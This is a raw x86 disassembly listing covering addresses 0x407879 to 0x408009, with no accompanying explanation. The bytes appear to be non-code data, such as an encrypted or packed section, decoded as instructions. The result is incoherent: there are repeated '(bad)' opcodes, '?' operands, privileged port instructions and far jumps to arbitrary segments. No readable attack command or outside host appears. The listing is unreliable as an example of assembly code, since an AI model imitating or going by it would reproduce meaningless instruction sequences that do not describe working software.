  407879:	lods   eax,DWORD PTR ds:[esi]
  40787a:	adc    bl,BYTE PTR [ecx]
  40787c:	stos   DWORD PTR es:[edi],eax
  40787d:	xchg   ecx,eax
  40787e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40787f:	sar    DWORD PTR [ebp+0x6560729c],1
  407885:	shr    DWORD PTR [ebp+eax*2-0x26],0x15
  40788a:	mov    eax,ds:0x23154a4b
  40788f:	dec    ebx
  407890:	jb     0x40782f
  407892:	push   edi
  407893:	jns    0x40788b
  407895:	rcl    DWORD PTR [ebx],cl
  407897:	stos   BYTE PTR es:[edi],al
  407898:	jmp    0x40781c
  40789a:	xchg   edi,eax
  40789b:	repz mov bl,0xec
  40789e:	inc    esp
  40789f:	dec    eax
  4078a0:	jmp    0x4b8c6061
  4078a5:	leave  
  4078a6:	mov    eax,ds:0x42e9aade
  4078ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078ac:	sahf   
  4078ad:	mov    DWORD PTR [eax-0x41b45c5e],edi
  4078b3:	mov    edx,0x435b1736
  4078b8:	mov    ecx,0xe35780f0
  4078bd:	ret    0x888f
  4078c0:	lock pop edi
  4078c2:	xor    ah,BYTE PTR ds:0xff3cd604
  4078c8:	xchg   esp,eax
  4078c9:	dec    eax
  4078ca:	lea    esp,[eax]
  4078cc:	sbb    ch,BYTE PTR [ebp+0x1c]
  4078cf:	sti    
  4078d0:	mov    eax,0x8e129d7e
  4078d5:	dec    ebx
  4078d6:	dec    esi
  4078d7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078d9:	sbb    al,0xde
  4078db:	(bad)  
  4078dc:	iret   
  4078dd:	lods   al,BYTE PTR ds:[esi]
  4078de:	aas    
  4078df:	shl    BYTE PTR [eax-0x6ce93a36],cl
  4078e5:	sti    
  4078e6:	inc    ecx
  4078e7:	cwde   
  4078e8:	outs   dx,BYTE PTR ds:[esi]
  4078e9:	mov    dl,0xc4
  4078eb:	in     eax,0x47
  4078ed:	mov    ds:0x20aa6d2e,al
  4078f2:	sti    
  4078f3:	fnstenv [ebx-0x9]
  4078f6:	mov    esp,0x9662ce2e
  4078fb:	push   ecx
  4078fc:	lods   eax,DWORD PTR ds:[esi]
  4078fd:	jecxz  0x40788b
  4078ff:	aad    0x22
  407901:	fsub   DWORD PTR [ebx]
  407903:	ficom  DWORD PTR ds:0x2f92a92
  407909:	dec    eax
  40790a:	das    
  40790b:	jecxz  0x4078d4
  40790d:	retf   
  40790e:	ret    0x7435
  407911:	or     BYTE PTR [eax-0x4a],al
  407914:	mov    edi,0xe1ea138e
  407919:	mov    esi,0x28fbbc4
  40791e:	mov    ecx,0xfd29ff91
  407923:	sbb    ebx,0x19
  407926:	in     al,0x67
  407928:	mov    DWORD PTR [eax-0x6d8380b5],edi
  40792e:	lea    edi,es:[eax]
  407931:	jmp    0x407910
  407933:	sub    bl,BYTE PTR [edi+0x39]
  407936:	jle    0x407934
  407938:	mov    ebx,0x7eaa1aa3
  40793d:	add    ebx,DWORD PTR [edx-0x3]
  407940:	and    al,0x91
  407942:	sub    al,0x68
  407944:	scas   al,BYTE PTR es:[edi]
  407945:	sti    
  407946:	push   ecx
  407947:	clc    
  407948:	cwde   
  407949:	adc    ch,al
  40794b:	pop    edx
  40794c:	xchg   edx,eax
  40794d:	call   FWORD PTR [eax+0x59]
  407950:	push   ss
  407951:	repnz stos DWORD PTR es:[edi],eax
  407953:	xchg   DWORD PTR [esp+esi*8],edx
  407956:	bnd jo 0x407917
  407959:	aad    0xfb
  40795b:	mov    al,0x70
  40795d:	push   ss
  40795e:	and    dh,bl
  407960:	mov    ecx,0x41f75746
  407965:	sbb    esp,edx
  407967:	sub    al,0xfa
  407969:	outs   dx,BYTE PTR ds:[esi]
  40796a:	sbb    dh,BYTE PTR [eax]
  40796c:	nop
  40796d:	and    esi,DWORD PTR [ebx-0x61645a31]
  407973:	xchg   edx,eax
  407974:	xchg   edi,eax
  407975:	inc    ebx
  407976:	pop    eax
  407977:	(bad)  
  407978:	mov    ebx,0x3102244f
  40797d:	pop    esp
  40797e:	arpl   WORD PTR [ecx],dx
  407980:	test   DWORD PTR [ebp-0x62],0xc1a16c7c
  407987:	xchg   DWORD PTR [esp+eax*8],eax
  40798a:	call   0x5189f54e
  40798f:	mov    ecx,0x45980c4
  407994:	mov    al,0x81
  407996:	mov    cl,0x8b
  407998:	or     ecx,DWORD PTR [edi+0x2c18ac48]
  40799e:	xchg   esi,eax
  40799f:	sbb    al,0xd5
  4079a1:	pop    edx
  4079a2:	xor    edx,DWORD PTR [ebp-0x4c]
  4079a5:	outs   dx,DWORD PTR ds:[esi]
  4079a6:	xor    dl,BYTE PTR [esi+0x39]
  4079a9:	mov    gs,WORD PTR [ebx]
  4079ab:	mov    esp,0x93add134
  4079b0:	add    ecx,DWORD PTR [ebx+0x1b]
  4079b3:	inc    edi
  4079b4:	in     al,0x8
  4079b6:	cmp    BYTE PTR [edx+0x12],ah
  4079b9:	loop   0x4079d1
  4079bb:	out    dx,eax
  4079bc:	les    ebx,FWORD PTR [ebp+0x5e914865]
  4079c2:	ds mov ebx,0x9f5dc500
  4079c8:	pop    eax
  4079c9:	or     al,0xc2
  4079cb:	mov    bl,0x8f
  4079cd:	adc    eax,0xe80f45fe
  4079d2:	adc    dl,dh
  4079d4:	cmc    
  4079d5:	add    BYTE PTR ds:0xf7fa6839,ah
  4079db:	mov    bh,0xe4
  4079dd:	cmp    al,0x78
  4079df:	pop    edi
  4079e0:	xor    cl,BYTE PTR [edi-0x108e4c63]
  4079e6:	adc    cl,bh
  4079e8:	outs   dx,BYTE PTR ds:[esi]
  4079e9:	pop    es
  4079ea:	dec    ebx
  4079eb:	lahf   
  4079ec:	aas    
  4079ed:	popf   
  4079ee:	mov    cl,0x92
  4079f0:	pop    es
  4079f1:	xor    eax,0x98acd7d7
  4079f6:	push   ds
  4079f7:	xor    DWORD PTR [esi+edi*1+0x72a8274],esi
  4079fe:	or     ah,BYTE PTR [ebx+0x43]
  407a01:	mov    esi,0x3568dc1a
  407a06:	popf   
  407a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a09:	daa    
  407a0a:	daa    
  407a0b:	adc    eax,0x39af8cdb
  407a10:	add    eax,0x84e08cfb
  407a15:	mov    esi,0xea49d6f
  407a1a:	mov    WORD PTR [eax+0x63],?
  407a1d:	fwait
  407a1e:	and    BYTE PTR [esp+eax*8-0x51],dl
  407a22:	inc    ecx
  407a23:	idiv   DWORD PTR [ebx+eax*4]
  407a26:	add    ebx,DWORD PTR [edi]
  407a28:	dec    eax
  407a29:	sbb    al,0x11
  407a2b:	into   
  407a2c:	dec    ebx
  407a2d:	xor    BYTE PTR [edx+0x57],ah
  407a30:	and    al,0x2
  407a32:	cmp    al,BYTE PTR [ebp-0x52]
  407a35:	mov    dl,0xbc
  407a37:	in     eax,dx
  407a38:	rcr    BYTE PTR [esi+0x39e9ee28],1
  407a3e:	push   0x5cc6799d
  407a43:	test   DWORD PTR [eax-0x293356c0],edi
  407a49:	xor    DWORD PTR [ecx+0x13],ecx
  407a4c:	(bad)  
  407a4d:	pop    ss
  407a4e:	pushf  
  407a4f:	out    0xd4,eax
  407a51:	adc    ebp,DWORD PTR [eax]
  407a53:	(bad)  
  407a54:	jno    0x407a01
  407a56:	xor    eax,0x9fe91fed
  407a5b:	scas   eax,DWORD PTR es:[edi]
  407a5c:	mov    ss,WORD PTR [edx]
  407a5e:	dec    eax
  407a5f:	fs dec ecx
  407a61:	mov    dl,0xa1
  407a63:	lea    esp,ds:0x5fef8e64
  407a69:	jne    0x407ad0
  407a6b:	(bad)  
  407a6c:	sub    DWORD PTR [esi],edi
  407a6e:	mov    dl,0x85
  407a70:	pop    edi
  407a71:	addr16 ja 0x407a8d
  407a74:	inc    ebp
  407a75:	sbb    eax,0xb8501b7f
  407a7a:	sub    dh,BYTE PTR [ebx-0x63]
  407a7d:	shl    BYTE PTR [ebp-0x68681485],1
  407a83:	cmp    dh,BYTE PTR [ebx-0x36]
  407a86:	adc    cl,BYTE PTR [ecx+0x12888829]
  407a8c:	rcr    BYTE PTR [ecx],1
  407a8e:	imul   esi,DWORD PTR [ebx+eiz*1],0xf597cb9e
  407a95:	cmp    eax,0x23d95141
  407a9a:	adc    al,0x12
  407a9c:	out    dx,eax
  407a9d:	stos   BYTE PTR es:[edi],al
  407a9e:	mov    ebx,0x85d8ffc4
  407aa3:	xor    al,0xa7
  407aa5:	stos   BYTE PTR es:[edi],al
  407aa6:	inc    eax
  407aa7:	sti    
  407aa8:	clc    
  407aa9:	add    DWORD PTR [eax-0x6895cf13],eax
  407aaf:	and    edx,DWORD PTR [esi+0x4a]
  407ab2:	pop    ebx
  407ab3:	sub    esi,ebx
  407ab5:	cmp    eax,0x4de24742
  407aba:	xor    al,0x96
  407abc:	mov    ebx,0xf03ec388
  407ac1:	nop
  407ac2:	popa   
  407ac3:	cld    
  407ac4:	pop    esi
  407ac5:	addr16 sub eax,0xc6922795
  407acb:	pop    ebp
  407acc:	push   edx
  407acd:	inc    ebx
  407ace:	pushf  
  407acf:	cmp    ebx,DWORD PTR [ebp-0x76]
  407ad2:	js     0x407a57
  407ad4:	add    DWORD PTR [edx+eax*4+0x36],ebp
  407ad8:	jns    0x407afd
  407ada:	popf   
  407adb:	push   ds
  407adc:	cs (bad) 
  407ade:	pop    esp
  407adf:	in     al,0x66
  407ae1:	and    DWORD PTR [edi-0x45],ebp
  407ae4:	ins    BYTE PTR es:[edi],dx
  407ae5:	adc    eax,0xcfc9bddc
  407aea:	mov    edi,0xa06f1ec6
  407aef:	imul   ebx,DWORD PTR cs:[eax],0x48
  407af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407af4:	inc    edi
  407af5:	out    0xb0,al
  407af7:	jmp    0x407b2a
  407af9:	(bad)  
  407afa:	jnp    0x407a7d
  407afc:	xor    al,0xce
  407afe:	sub    edi,DWORD PTR [ecx]
  407b00:	pop    ebp
  407b01:	cmc    
  407b02:	add    al,0x4a
  407b04:	test   eax,0x26111b1
  407b09:	mov    ah,0x87
  407b0b:	dec    edx
  407b0c:	js     0x407b3b
  407b0e:	jmp    0xb7df:0x6cade179
  407b15:	call   0xa75d:0x2f527733
  407b1c:	cli    
  407b1d:	jge    0x407b92
  407b1f:	pop    ecx
  407b20:	shr    BYTE PTR [edx],cl
  407b22:	lock mov al,0x25
  407b25:	jnp    0x407abd
  407b27:	inc    esi
  407b28:	add    DWORD PTR [eax],ebp
  407b2a:	jns    0x407b9e
  407b2c:	pop    ds
  407b2d:	in     al,dx
  407b2e:	mov    esp,0x89e2be74
  407b33:	mov    ebp,0x9b49f6d
  407b38:	lahf   
  407b39:	or     al,0x5e
  407b3b:	jo     0x407abf
  407b3d:	or     eax,0xaddd124a
  407b42:	dec    ecx
  407b43:	in     al,0x16
  407b45:	dec    esp
  407b46:	push   eax
  407b47:	dec    DWORD PTR [ecx]
  407b49:	aaa    
  407b4a:	shl    DWORD PTR [esi],cl
  407b4c:	and    eax,ebp
  407b4e:	push   0x1355bd3f
  407b53:	adc    BYTE PTR [eax],ch
  407b55:	out    dx,eax
  407b56:	(bad)  
  407b58:	fstp   TBYTE PTR [ecx-0x2f3f8843]
  407b5e:	arpl   ax,di
  407b60:	ja     0x407bdc
  407b62:	xchg   esp,eax
  407b63:	mov    ah,0x4a
  407b65:	pop    eax
  407b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b67:	push   esi
  407b68:	or     bh,BYTE PTR [ecx]
  407b6a:	xor    al,BYTE PTR [eax+0x3a]
  407b6d:	into   
  407b6e:	jbe    0x407b16
  407b70:	inc    esi
  407b71:	inc    ebp
  407b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b73:	mov    cl,BYTE PTR [ecx-0x1b]
  407b76:	shl    BYTE PTR [esi-0x4ce01829],cl
  407b7c:	aam    0xfc
  407b7e:	pop    es
  407b7f:	mov    edx,0x1a21a63a
  407b84:	mov    ebp,0x432d5d53
  407b89:	xor    DWORD PTR [edi],ecx
  407b8b:	pushf  
  407b8c:	out    0x2e,eax
  407b8e:	xchg   ecx,eax
  407b8f:	adc    DWORD PTR [edi+0x78fb0e2c],esi
  407b95:	rcr    DWORD PTR [edi],1
  407b97:	leave  
  407b98:	ins    BYTE PTR es:[edi],dx
  407b99:	push   0x4f
  407b9b:	adc    edx,DWORD PTR [ebx+eiz*4-0x5f38d878]
  407ba2:	push   edx
  407ba3:	push   ebx
  407ba4:	push   esp
  407ba5:	(bad)  
  407ba6:	stos   DWORD PTR es:[edi],eax
  407ba7:	inc    esp
  407ba8:	sahf   
  407ba9:	jmp    0xf7255c90
  407bae:	jp     0x407bff
  407bb0:	pop    DWORD PTR [ebp+0x8]
  407bb3:	sub    cl,BYTE PTR [ebx]
  407bb5:	pop    edx
  407bb6:	xchg   esp,eax
  407bb7:	aas    
  407bb8:	js     0x407b50
  407bba:	dec    edi
  407bbb:	mov    ch,0x85
  407bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbe:	(bad)  
  407bbf:	xchg   edi,eax
  407bc0:	xor    BYTE PTR ds:[edi+0x2c],bh
  407bc4:	dec    eax
  407bc5:	mov    edi,0xcac3d0ae
  407bca:	fistp  DWORD PTR [eax+0x22]
  407bcd:	or     al,BYTE PTR [ebx-0x4aadd807]
  407bd3:	push   ebp
  407bd4:	fadd   QWORD PTR [esi]
  407bd6:	fistp  DWORD PTR [eax+0x1174454c]
  407bdc:	cmp    eax,0xc39262d5
  407be1:	in     al,dx
  407be2:	in     eax,0x11
  407be4:	das    
  407be5:	out    0xf2,al
  407be7:	jmp    0x1b17:0x962dc45d
  407bee:	test   eax,0x3c727d2f
  407bf3:	fsubr  DWORD PTR [ebx*1+0x1ff7a039]
  407bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bfb:	mov    ebp,0x7e6d264
  407c00:	in     eax,0x6d
  407c02:	jle    0x407c82
  407c04:	inc    eax
  407c05:	shr    dh,0x36
  407c08:	mov    ebp,0x490a4c77
  407c0d:	add    BYTE PTR [ebp-0x5c],ch
  407c10:	pushw  ds
  407c12:	inc    ebp
  407c13:	test   esi,0xe894b509
  407c19:	sub    eax,0xa5f2267
  407c1e:	std    
  407c1f:	jbe    0x407bca
  407c21:	sar    BYTE PTR [ecx],cl
  407c23:	(bad)  
  407c24:	lock (bad) 
  407c27:	out    dx,eax
  407c28:	inc    ebp
  407c29:	loop   0x407bab
  407c2b:	jge    0x407c95
  407c2d:	pusha  
  407c2e:	xchg   edx,eax
  407c2f:	cmp    al,0x72
  407c31:	fmul   st(1),st
  407c33:	inc    ecx
  407c34:	xor    al,ch
  407c36:	mov    bl,0xa6
  407c38:	add    DWORD PTR [ecx],edx
  407c3a:	mov    edi,0xa43d1cf
  407c3f:	jp     0x407c17
  407c41:	call   DWORD PTR [edx+0xa05038b]
  407c47:	or     BYTE PTR [ebp+0x1e],cl
  407c4a:	(bad)  
  407c4b:	fst    QWORD PTR [edx-0x1a983351]
  407c51:	mov    cl,0xc7
  407c53:	jg     0x407c4a
  407c55:	pusha  
  407c56:	and    ecx,DWORD PTR [edi+0x4c053223]
  407c5c:	jns    0x407c90
  407c5e:	dec    edx
  407c5f:	jo     0x407c54
  407c61:	fwait
  407c62:	jle    0x407c6f
  407c64:	xchg   ebx,eax
  407c65:	xchg   ecx,eax
  407c66:	push   ds
  407c67:	mov    cl,0x1d
  407c69:	sbb    eax,0x71052048
  407c6e:	pop    ebp
  407c6f:	mov    esi,0x214d8a1d
  407c74:	aam    0xb2
  407c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c77:	xchg   BYTE PTR [ebx],cl
  407c79:	push   eax
  407c7a:	adc    eax,0x7f6ef5d
  407c7f:	pop    esi
  407c80:	mov    ah,0x8a
  407c82:	cmp    BYTE PTR [ecx],0x9c
  407c85:	xchg   ebx,eax
  407c86:	(bad)  
  407c87:	iret   
  407c88:	cmp    eax,ebp
  407c8a:	aaa    
  407c8b:	jp     0x407c40
  407c8d:	pop    esi
  407c8e:	push   0xfcd8658c
  407c93:	jno    0x407cd0
  407c95:	adc    eax,0xd54905cf
  407c9a:	lods   eax,DWORD PTR ds:[esi]
  407c9b:	xchg   ebp,eax
  407c9c:	push   cs
  407c9d:	or     eax,0xfdb6fa1e
  407ca2:	push   eax
  407ca3:	aad    0x7f
  407ca5:	xor    eax,0x7e3279c2
  407caa:	icebp  
  407cab:	and    esp,DWORD PTR [eax+esi*8-0x5c]
  407caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb0:	jbe    0x407d03
  407cb2:	mov    bl,0xaf
  407cb4:	mov    dh,BYTE PTR [ecx-0x9]
  407cb7:	js     0x407cb5
  407cb9:	fidivr DWORD PTR ds:0x22444b5
  407cbf:	dec    edi
  407cc0:	sub    eax,0xc23bd956
  407cc5:	fs (bad) 
  407cc7:	scas   eax,DWORD PTR es:[edi]
  407cc8:	imul   esp,edx,0xe3a9b920
  407cce:	cli    
  407ccf:	jp     0x407cf7
  407cd1:	xor    DWORD PTR [edi-0x7c4051cb],0x46
  407cd8:	ins    DWORD PTR es:[edi],dx
  407cd9:	mov    dh,0x5c
  407cdb:	shr    BYTE PTR [ebx+0x5b1c37d],cl
  407ce1:	iret   
  407ce2:	xchg   ebp,eax
  407ce3:	ss push 0xd0ebf7ff
  407ce9:	bt     DWORD PTR [edx],ebp
  407cec:	shr    DWORD PTR [edi-0x35],1
  407cef:	test   al,0x72
  407cf1:	push   edi
  407cf2:	or     edi,esi
  407cf4:	xor    esi,esi
  407cf6:	pop    ds
  407cf7:	out    dx,al
  407cf8:	ss pop esp
  407cfa:	(bad)  
  407cfb:	pop    edx
  407cfc:	adc    dl,BYTE PTR fs:[edi]
  407cff:	frstor [ecx-0x44057bb3]
  407d05:	fdivr  DWORD PTR [eax+0x3a]
  407d08:	add    al,0xe6
  407d0a:	xchg   esp,eax
  407d0b:	ins    BYTE PTR es:[edi],dx
  407d0c:	add    eax,0x879be628
  407d11:	in     eax,0x39
  407d13:	repnz and esi,esp
  407d16:	lods   al,BYTE PTR ds:[esi]
  407d17:	sbb    dl,BYTE PTR [edx-0x7b]
  407d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d1b:	add    ebx,DWORD PTR [edi+0x35985dba]
  407d21:	fcom   QWORD PTR gs:[esi]
  407d24:	jg     0x407cff
  407d26:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  407d28:	cmp    DWORD PTR [eax],esp
  407d2a:	stos   DWORD PTR es:[edi],eax
  407d2b:	adc    BYTE PTR [edi],ch
  407d2d:	mov    ah,0x44
  407d2f:	hlt    
  407d30:	cmp    BYTE PTR [ebx+0x5c],dh
  407d33:	pop    eax
  407d34:	fistp  QWORD PTR [ecx]
  407d36:	dec    edi
  407d37:	loopne 0x407cd5
  407d39:	xchg   ebx,eax
  407d3a:	pop    ebx
  407d3b:	inc    ebx
  407d3c:	(bad)  
  407d3e:	cmp    DWORD PTR [ebx],edi
  407d40:	jmp    0x333ddd9e
  407d45:	sub    dl,BYTE PTR [esi-0x361b4966]
  407d4b:	mov    dh,0x97
  407d4d:	out    dx,eax
  407d4e:	cmp    eax,0x8057096d
  407d53:	(bad)  [ebp+0x69]
  407d56:	sbb    esi,edx
  407d58:	mov    esi,0x2caf538c
  407d5d:	and    al,0x71
  407d5f:	jb     0x407d6d
  407d61:	sub    DWORD PTR [esi],edx
  407d63:	aas    
  407d64:	xchg   BYTE PTR [edi-0x32],dl
  407d67:	je     0x407d51
  407d69:	jle    0x407d3f
  407d6b:	push   0x3e
  407d6d:	imul   esp,DWORD PTR [eax],0xffffffcf
  407d70:	cmp    al,0xab
  407d72:	loope  0x407d03
  407d74:	jno    0x407d4a
  407d76:	sub    al,0x62
  407d78:	rcl    eax,cl
  407d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d7b:	mov    ch,0xa9
  407d7d:	pop    ecx
  407d7e:	outs   dx,BYTE PTR ds:[esi]
  407d7f:	mov    ecx,0xd5abd16c
  407d84:	push   cs
  407d85:	test   BYTE PTR [eax+0x56336a4f],cl
  407d8b:	inc    ebp
  407d8c:	int    0x31
  407d8e:	(bad)  
  407d8f:	leave  
  407d90:	sbb    eax,0x535785cd
  407d95:	mov    ecx,0x6c16d07
  407d9a:	xchg   edx,eax
  407d9b:	and    eax,0x71e3f057
  407da0:	lea    esi,[eax]
  407da2:	mov    dh,0xd
  407da4:	jmp    0xe87ea2a0
  407da9:	sbb    bl,ch
  407dab:	pop    ss
  407dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dad:	mov    DWORD PTR [edi-0x35486569],esp
  407db3:	pop    ss
  407db4:	mov    esi,0x232266da
  407db9:	ret    
  407dba:	mov    ds:0x1e042832,eax
  407dbf:	scas   al,BYTE PTR es:[edi]
  407dc0:	add    eax,0x82140da0
  407dc5:	mov    ch,0xf5
  407dc7:	inc    ebp
  407dc8:	push   ebx
  407dc9:	js     0x407dd7
  407dcb:	popf   
  407dcc:	add    DWORD PTR [eax+esi*8-0x3a],ebx
  407dd0:	mov    edx,0x9b1b269f
  407dd5:	add    BYTE PTR [eax+0x58c80d44],bl
  407ddb:	jge    0x407df8
  407ddd:	dec    ebx
  407dde:	lods   eax,DWORD PTR ds:[esi]
  407ddf:	or     DWORD PTR [esp+edi*1],ebp
  407de2:	sub    al,0xf8
  407de4:	sahf   
  407de5:	cwde   
  407de6:	lock xchg DWORD PTR [ebp+0x68610044],ebx
  407ded:	fstp   TBYTE PTR [esi-0x63]
  407df0:	or     ecx,DWORD PTR [ebx+0x66bda823]
  407df6:	aas    
  407df7:	add    esp,edi
  407df9:	mov    bl,0xd4
  407dfb:	loopne 0x407e6d
  407dfd:	dec    edx
  407dfe:	dec    ecx
  407dff:	(bad)  
  407e00:	imul   ebx,DWORD PTR [edx+ecx*4],0xdd6ad2e5
  407e07:	push   ss
  407e08:	in     eax,0xf3
  407e0a:	in     al,dx
  407e0b:	adc    eax,0x40163c7b
  407e10:	sar    BYTE PTR [edx+0x3d],1
  407e13:	adc    al,0x44
  407e15:	xlat   BYTE PTR ds:[ebx]
  407e16:	cmp    eax,0xf47bf419
  407e1b:	repnz sub ah,BYTE PTR [edx]
  407e1e:	and    eax,0xbc19e599
  407e23:	mov    esp,0xa4e7abce
  407e28:	inc    edx
  407e29:	dec    ebx
  407e2a:	add    ah,BYTE PTR [edx+0x13]
  407e2d:	rcr    BYTE PTR [ecx+0x710c2d87],1
  407e33:	jmp    0x144f:0x6decd0d2
  407e3a:	jge    0x407e4f
  407e3c:	xor    BYTE PTR [eax-0x69bcc325],ah
  407e42:	loop   0x407e62
  407e44:	jb     0x407e6b
  407e46:	pop    ebp
  407e47:	sub    cl,BYTE PTR [edi]
  407e49:	jl     0x407ec1
  407e4b:	test   DWORD PTR [eax],esi
  407e4d:	test   ecx,ebp
  407e4f:	retf   
  407e50:	sbb    ch,BYTE PTR gs:[ecx]
  407e53:	hlt    
  407e54:	sub    dl,BYTE PTR [esi+edx*1-0x10]
  407e58:	(bad)  
  407e59:	call   0x71b1:0x15935ee3
  407e60:	js     0x407e23
  407e62:	mov    ?,WORD PTR [esi]
  407e64:	mov    bh,BYTE PTR [ecx]
  407e66:	pop    esi
  407e67:	xor    al,0x3b
  407e69:	outs   dx,DWORD PTR ds:[esi]
  407e6a:	loope  0x407e2d
  407e6c:	xor    BYTE PTR [ebp+esi*1+0x77d3dec8],ch
  407e73:	lock stc 
  407e75:	push   ecx
  407e76:	lahf   
  407e77:	ds push cs
  407e79:	mov    bl,bh
  407e7b:	mov    al,0x18
  407e7d:	push   cs
  407e7e:	adc    ebx,DWORD PTR [edi+0x16]
  407e81:	mul    BYTE PTR [ebp+0x75]
  407e84:	push   edx
  407e85:	adc    dh,BYTE PTR [edi-0x4d]
  407e88:	mov    ebx,0x954ae129
  407e8d:	iret   
  407e8e:	push   edi
  407e8f:	test   BYTE PTR [eax+ebx*1],cl
  407e92:	mov    ebx,0x9fe137c8
  407e97:	jecxz  0x407e52
  407e99:	jmp    0xe5f7:0x16c0f900
  407ea0:	push   edx
  407ea1:	ret    0x32a1
  407ea4:	sbb    eax,0xd7516184
  407ea9:	ficom  DWORD PTR [edx+eax*1]
  407eac:	mov    edx,0x5a0213e1
  407eb1:	sbb    eax,0x2fb137a8
  407eb6:	push   esp
  407eb7:	jne    0x407eef
  407eb9:	(bad)  
  407eba:	jmp    0xa0e8:0xfe7fcaea
  407ec1:	daa    
  407ec2:	adc    edi,DWORD PTR fs:[esi+eiz*1]
  407ec6:	pop    ss
  407ec7:	fs inc ebp
  407ec9:	lods   eax,DWORD PTR ds:[esi]
  407eca:	cdq    
  407ecb:	sub    ebx,DWORD PTR [esi+eax*8]
  407ece:	pop    ebp
  407ecf:	aaa    
  407ed0:	sub    eax,0x488ae64e
  407ed5:	aam    0x8d
  407ed7:	and    eax,0xd2790164
  407edc:	inc    ebp
  407edd:	adc    BYTE PTR [esi+eiz*8+0x2],dh
  407ee1:	fild   DWORD PTR [ecx]
  407ee3:	jnp    0x407ebe
  407ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee6:	jmp    0x407f0f
  407ee8:	jg     0x407ec6
  407eea:	jae    0x407f61
  407eec:	lds    edx,FWORD PTR [edi-0x3c]
  407eef:	ds gs rcr ebx,cl
  407ef3:	sub    al,0x52
  407ef5:	jg     0x407e9c
  407ef7:	cmp    dh,dl
  407ef9:	fcmovne st,st(6)
  407efb:	sbb    DWORD PTR [edx*2-0x76d289c8],eax
  407f02:	call   0xe29:0x81f34e2d
  407f09:	mov    dh,0xc2
  407f0b:	jno    0x407e9c
  407f0d:	mov    esi,0xf8bc2ee4
  407f12:	mov    dh,0x9f
  407f14:	fnstsw WORD PTR [ebx]
  407f16:	push   0xf29c1280
  407f1b:	cdq    
  407f1c:	fistp  QWORD PTR [ecx+0x288118c2]
  407f22:	imul   esp,ecx,0xf166d224
  407f28:	adc    bl,al
  407f2a:	mov    WORD PTR [eax+0x57],gs
  407f2d:	or     BYTE PTR [edx],ch
  407f2f:	mov    gs,WORD PTR [esi]
  407f31:	xchg   BYTE PTR [edx+0x5154b364],al
  407f37:	out    0x54,eax
  407f39:	das    
  407f3a:	jne    0x407fb1
  407f3c:	(bad)  
  407f3d:	daa    
  407f3e:	jmp    0x60d5:0x691f3e4a
  407f45:	mov    DWORD PTR [esi+0x7777d7f8],ebx
  407f4b:	les    ebp,FWORD PTR [edx+ecx*8]
  407f4e:	cmp    eax,0x4fe90881
  407f53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f54:	mov    bh,0xc8
  407f56:	mov    bl,0x4f
  407f58:	shl    bl,cl
  407f5a:	sbb    esp,ebp
  407f5c:	test   BYTE PTR [esi*1-0x14941ef9],bl
  407f63:	push   cs
  407f64:	pushf  
  407f65:	out    dx,eax
  407f66:	lahf   
  407f67:	enter  0x8656,0xdb
  407f6b:	pop    DWORD PTR [ecx-0x1c]
  407f6e:	out    dx,eax
  407f6f:	sbb    BYTE PTR [eax+0x61],bl
  407f72:	jbe    0x407f67
  407f74:	add    eax,0xcbc46fff
  407f79:	rcl    DWORD PTR [ebp+0x386ee07],0xeb
  407f80:	and    dh,BYTE PTR [edx]
  407f82:	push   esp
  407f83:	cwde   
  407f84:	fcom   QWORD PTR [edi]
  407f86:	jle    0x407fec
  407f88:	or     edi,eax
  407f8a:	dec    eax
  407f8b:	les    ecx,FWORD PTR [ecx-0x205a38b0]
  407f91:	dec    edx
  407f92:	xchg   ah,ch
  407f94:	ror    BYTE PTR [eax-0x3f],0xe6
  407f98:	test   eax,0x7a69bcfc
  407f9d:	test   BYTE PTR [ebx+0x50e9df72],al
  407fa3:	imul   esp,ebp,0x23
  407fa6:	jmp    0x407f43
  407fa8:	sbb    DWORD PTR [esi],eax
  407faa:	in     eax,dx
  407fab:	ins    DWORD PTR es:[edi],dx
  407fac:	push   ebx
  407fad:	cdq    
  407fae:	lock and DWORD PTR [esi+0x64],ebp
  407fb2:	inc    ebp
  407fb3:	pop    es
  407fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fb5:	enter  0x2779,0x8f
  407fb9:	dec    ebx
  407fba:	or     ecx,ecx
  407fbc:	adc    BYTE PTR [edx-0x1698f0f],dl
  407fc2:	fist   WORD PTR [ebp-0x2ac69046]
  407fc8:	in     eax,dx
  407fc9:	stos   BYTE PTR es:[edi],al
  407fca:	mov    eax,0xf40a7d7c
  407fcf:	enter  0x2c4d,0x82
  407fd3:	xchg   ecx,eax
  407fd4:	mov    edx,0xff5bf84e
  407fd9:	pop    ebx
  407fda:	popa   
  407fdb:	add    dh,al
  407fdd:	sub    DWORD PTR [esi+0x60],ecx
  407fe0:	push   edi
  407fe1:	adc    BYTE PTR [esi+0x42],dl
  407fe4:	xchg   DWORD PTR [ebx+0x79],esi
  407fe7:	popa   
  407fe8:	out    0x78,eax
  407fea:	out    0x3,al
  407fec:	ror    ah,0x25
  407fef:	jp     0x407fd9
  407ff1:	in     eax,dx
  407ff2:	mul    BYTE PTR [ebx+0x63]
  407ff5:	sbb    BYTE PTR [edx-0x449e1c37],dl
  407ffb:	pop    edi
  407ffc:	shl    DWORD PTR [esi-0x392bfa69],0xc0
  408003:	xchg   edx,eax
  408004:	push   esp
  408005:	jge    0x407fac
  408007:	xchg   ebx,eax
  408008:	stc    
  408009:	jnp    0x407fc5
